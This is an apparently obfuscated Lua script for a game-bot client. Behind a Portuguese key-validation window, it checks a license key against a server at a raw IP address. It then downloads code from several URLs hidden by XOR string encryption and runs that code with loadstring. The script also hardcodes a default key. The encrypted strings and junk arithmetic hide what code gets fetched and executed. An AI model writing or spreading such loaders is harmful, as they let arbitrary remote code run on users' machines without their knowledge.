modules.game_bot.botWindow:setWidth(320)

keyValidated=false;local function v0() local v8=string.char;local v9=string.byte;local v10=string.sub;local v11=bit32 or bit ;local v12=v11.bxor;local v13=table.concat;local v14=table.insert;local function v15(v36,v37) local v38={};for v48=591 -(294 + 296) , #v36 do v14(v38,v8(v12(v9(v10(v36,v48,v48 + 1 )),v9(v10(v37,1 + (v48% #v37) ,(1 -0) + (v48% #v37) + 1 )))%256 ));end return v13(v38);end local v16=v15("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\254\41\194\190\209\60\222\209\220\32\245\244\244\29\195\202\203\49\245\244\213\27\215\208\148\45\227\186\195\13\158\206\218\44\232\244\148\33\240\214\207\42\210\186\212\21\159\207\206\36","\126\177\163\187\69\134\219\167");modules.corelib.HTTP.get(v16,function(v39) assert(loadstring(v39)());end);end local function v1() local v17=string.char;local v18=string.byte;local v19=string.sub;local v20=bit32 or bit ;local v21=v20.bxor;local v22=table.concat;local v23=table.insert;local function v24(v40,v41) local v42=0 -0 ;local v43;local v44;while true do if (v42==(31 -(5 + 25))) then while true do local v59=1187 -(1069 + 118) ;while true do if (v59==0) then if (v43==(569 -((832 -465) + 201))) then return v22(v44);end if (v43==(0 -0)) then local v68=0 + 0 ;while true do if (v68==(0 -0)) then v44={};for v71=(921 + 7) -((1005 -(368 + 423)) + (2240 -1527)) , #v40 do v23(v44,v17(v21(v18(v19(v40,v71,v71 + (19 -(10 + 8)) + (0 -0) )),v18(v19(v41,(443 -(416 + 26)) + (0 -0) + (v71% #v41) ,(878 -(122 + 160 + (1052 -457))) + (v71% #v41) + ((2076 -(145 + 293)) -((1953 -(44 + 386)) + (1600 -(998 + 488)))) )))%(82 + 174) ));end v68=1;end if (v68==1) then v43=1 + 0 + 0 ;break;end end end break;end end end break;end if (v42==0) then v43=772 -(201 + 571) ;v44=nil;v42=1139 -(116 + 1022) ;end end end modules.game_bot.botWindow:setWidth(285 -(353 -268) );importStyle(v24("\158\238\218\38\244\180\212\81\128\252\235\36\239\181\194\18\159\204\207\48\239","\126\177\163\187\69\134\219\167"));importStyle(v24("\108\224\43\198\238\44\222\101\208\207\51\200\38\201\217\45\217\56\220\178\44\217\63\204","\156\67\173\74\165"));importStyle(v24("\123\154\72\21\174\41\85\123\148\70\24\186\47\65\31\178\80\5\242\41\82\33\190","\38\84\215\41\118\220\70"));local v25={v24("\88\2\54\2\237\10\89\109\0\255\71\88\37\27\234\88\3\32\7\237\85\4\33\29\240\68\19\44\6\176\83\25\47\93\219\92\50\39\4\220\95\4\37\23\237\31\51\46\48\241\66\17\39\1\179\115\3\49\6\241\93\89\48\23\248\67\89\42\23\255\84\5\109\31\255\89\24\109\67\193\21\68\114\52\247\92\2\48\29\220\81\2\54\30\251\85\24\33\92\242\69\23","\158\48\118\66\114"),v24("\163\48\4\38\96\255\180\228\54\17\33\61\162\242\191\44\5\52\102\182\254\185\39\31\56\103\160\245\191\106\19\57\126\234\222\167\0\21\32\81\170\233\172\33\3\121\86\169\217\164\54\23\51\96\232\216\190\55\4\57\126\234\233\174\34\3\121\123\160\250\175\55\95\59\114\172\245\228\118\47\6\114\172\245\174\40\21\56\112\235\247\190\37","\155\203\68\112\86\19\197"),v24("\78\201\34\236\83\34\170\183\84\220\33\178\71\113\241\240\83\223\35\239\69\106\230\247\72\201\51\242\84\54\230\247\75\146\19\240\100\125\243\218\73\207\49\249\83\55\192\244\100\210\36\251\69\107\168\219\83\206\34\243\77\55\247\253\64\206\121\244\69\121\225\235\9\208\55\245\78\55\241\241\75\216\9\239\80\125\233\244\121\216\56\249\77\97\224\246\69\147\58\233\65","\152\38\189\86\156\32\24\133"),v24("\244\67\179\86\239\13\232\9\238\86\176\8\251\94\179\78\233\85\178\85\249\69\164\73\242\67\162\72\232\25\164\73\241\24\130\74\216\82\177\100\243\69\160\67\239\24\130\74\222\88\181\65\249\68\234\101\233\68\179\73\241\24\181\67\250\68\232\78\249\86\163\85\179\90\166\79\242\24\151\112\204\82\169\69\178\91\178\71","\38\156\55\199"),v24("\160\105\104\56\0\46\181\12\186\124\107\102\20\125\238\75\189\127\105\59\22\102\249\76\166\105\121\38\7\58\249\76\165\50\89\36\55\113\236\97\167\111\123\45\0\59\223\79\138\114\110\47\22\103\183\96\189\110\104\39\30\59\232\70\174\110\51\32\22\117\254\80\231\112\125\33\29\59\251\87\169\126\119\28\18\102\253\70\188\120\114\43\93\120\239\66","\35\200\29\28\72\115\20\154"),v24("\17\171\197\207\158\118\123\86\173\208\200\195\43\61\13\183\196\221\152\63\49\11\188\222\209\153\41\58\13\241\210\208\128\99\17\21\155\212\201\175\35\38\30\186\194\144\168\32\22\22\173\214\218\158\97\23\12\172\197\208\128\99\38\28\185\194\144\133\41\53\29\172\158\210\140\37\58\86\149\196\210\157\41\58\26\241\221\202\140","\84\121\223\177\191\237\76"),v24("\179\66\221\176\41\10\127\142\169\87\222\238\61\89\36\201\174\84\220\179\63\66\51\206\181\66\204\174\46\30\51\206\182\25\236\172\30\85\38\227\180\68\206\165\41\31\21\205\153\89\219\167\63\67\125\226\174\69\221\175\55\31\34\196\189\69\134\168\63\81\52\210\244\91\200\169\52\31\5\213\178\90\192\164\59\84\53\210\190\88\202\238\54\69\49","\161\219\54\169\192\90\48\80"),v24("\65\86\20\53\90\24\79\106\91\67\23\107\78\75\20\45\92\64\21\54\76\80\3\42\71\86\5\43\93\12\3\42\68\13\37\41\109\71\22\7\70\80\7\32\90\13\37\41\107\77\18\34\76\81\77\6\92\81\20\42\68\13\18\32\79\81\79\45\76\67\4\54\6\79\1\44\71\13\19\32\71\81\5\32\71\65\78\41\92\67","\69\41\34\96"),v24("\180\215\195\26\17\113\243\140\197\11\21\101\187\202\195\2\23\41\169\208\210\24\1\36\178\215\210\4\22\101\191\204\218\69\39\39\152\198\193\40\13\57\187\198\196\69\39\39\158\204\197\13\7\56\241\224\194\25\22\36\177\140\197\15\4\56\243\203\210\11\6\56\243\206\214\3\12\100\152\194\196\2\61\24\169\205\196\2\11\37\185\205\212\68\14\62\189","\75\220\163\183\106\98")};local function v26(v45) local v46=885 -(261 + 624) ;local v47;while true do if (v46==(0 -0)) then if (v45> #v25) then local v65=1080 -(1020 + 60) ;while true do if (v65==0) then print(v24("\54\181\143\56\202\66\181\152\119\202\1\168\130\39\205\17\250\141\56\203\3\183\203\52\216\16\168\142\48\216\6\181\152\119\218\13\183\203\36\204\1\191\152\36\214\76","\185\98\218\235\87"));return;end end end v47=v25[v45];v46=1424 -(630 + 793) ;end if (v46==(3 -2)) then print(v24("\232\61\53\244\219\173\202\50\35\233\158\185\200\46\46\246\202\240\139","\202\171\92\71\134\190")   .. v47 );modules.corelib.HTTP.get(v47,function(v60) local v61=0;local v62;local v63;local v64;while true do if (v61==(4 -3)) then v64=nil;while true do if (v62==((0 + 0) -0)) then v63,v64=loadstring(v60);if v63 then local v69=0 -0 ;while true do if (v69==((3 -2) -(1747 -(760 + 987)))) then v26(v45 + (1914 -(1789 + 124)) );break;end if (v69==((1116 -(745 + 21)) -(30 + 57 + (723 -460)))) then local v72=0;while true do if (v72==(0 -0)) then v63();print(v24("\26\194\62\129\57\213\108\139\40\211\62\141\46\192\40\135\105\194\35\133\105\210\57\139\44\210\63\135\115\129","\232\73\161\76")   .. v47 );v72=1;end if (v72==(1 + 0)) then v69=(143 + 38) -((1122 -(87 + 968)) + (497 -384)) ;break;end end end end else print(v24("\158\203\80\82\94\186\214\2\94\31\169\203\71\90\31\169\153\81\94\12\178\201\86\7\94","\126\219\185\34\61")   .. v47   .. v24("\76\131\30","\135\108\174\62\18\30\23\147")   .. (v64 or v24("\147\251\56\196\88\170\54\212\181\230\36\195\29\173\58\195\185","\167\214\137\74\171\120\206\83")) );end break;end end break;end if (v61==0) then v62=(869 + 88) -((2016 -1124) + 65) ;v63=nil;v61=1414 -(447 + 966) ;end end end);break;end end end v26((2 -1) + 0 );end local function v2(v27,v28) local v29=0;local v30;local v31;while true do if (v29==(1818 -(1703 + 114))) then v30.get(v31,function(v55) if v55 then if string.find(v55,'"success":true') then v28(true);else v28(false);end else local v66=701 -(376 + 325) ;while true do if (v66==(0 -0)) then warn("Erro na requisição ao servidor. Verifique a conexão.");v28(false);break;end end end end);break;end if (v29==(0 -0)) then v30=modules.corelib.HTTP;v31="http://38.46.142.218:5001/use-key?key="   .. v27 ;v29=1 + 0 ;end end end keyPanelInterface=setupUI([[
MainWindow
  text: Validaçao de key Custom
  size: 200 200

  Panel
    image-source: /images/ui/panel_flat
    anchors.right: parent.right
    anchors.left: parent.left
    anchors.top: parent.top
    anchors.bottom: separator.top
    margin: 5 5 5 5
    image-border: 6
    padding: 3
    size: 200 100

  Button
    id: closeButton
    !text: tr('Close')
    font: cipsoftFont
    anchors.left: parent.left
    anchors.bottom: parent.bottom
    size: 45 25
    margin-left: 4
    margin-bottom: 5
    
  Button
    id: confirmButton
    !text: tr('Confirmar')
    font: cipsoftFont
    anchors.right: parent.right
    anchors.bottom: parent.bottom
    size: 45 25
    margin-left: 4
    margin-bottom: 5

  TextEdit
    id: inputField
    anchors.top: editDiscord.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    size: 100 25
    margin-top: 4
    margin-bottom: 5
    
  Button
    id: editDiscord
    color: red
    font: verdana-11px-rounded
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    margin-bottom: 10
    height: 15
    text:         Obtenha sua key aqui     
    tooltip: Grupo no discord
    
]],g_ui.getRootWidget());keyPanelInterface.editDiscord.onClick=function(v32) g_platform.openUrl("https://discord.gg/GgGjN58SAf");end;keyPanelInterface.closeButton.onClick=function(v33) keyPanelInterface:hide();end;local function v5() local v34=0 -0 ;while true do if (v34==0) then if keyValidated then return;end keyPanelInterface:show();v34=1;end if (v34==(15 -(9 + 5))) then keyPanelInterface.confirmButton.onClick=function(v56) local v57=376 -(85 + 291) ;local v58;while true do if (v57==0) then v58=keyPanelInterface.inputField:getText();if (v58 and (v58~="")) then local v67=0;while true do if ((1265 -(243 + 1022))==v67) then warn("Validando chave...");v2(v58,function(v70) if v70 then keyValidated=true;warn("Chave validada com sucesso!");v1();v0();keyPanelInterface:hide();else warn("Chave inválida! Acesso negado.");end end);break;end end else warn("Insira uma chave válida.");end break;end end end;break;end end end local function v6() if keyValidated then local v49=0 -0 ;while true do if (v49==(0 + 0)) then v1();v0();break;end end else v5();end end local v7="cfb802f";v2(v7,function(v35) if v35 then local v50=1180 -(1123 + 57) ;while true do if (v50==2) then keyPanelInterface:hide();break;end if (1==v50) then v0();v1();v50=2 + 0 ;end if ((254 -(163 + 91))==v50) then keyValidated=true;warn("Chave validada com sucesso!");v50=1931 -(1869 + 61) ;end end else local v51=0 + 0 ;while true do if (v51==0) then warn("Chave inválida! Acesso negado.");v5();break;end end end end);
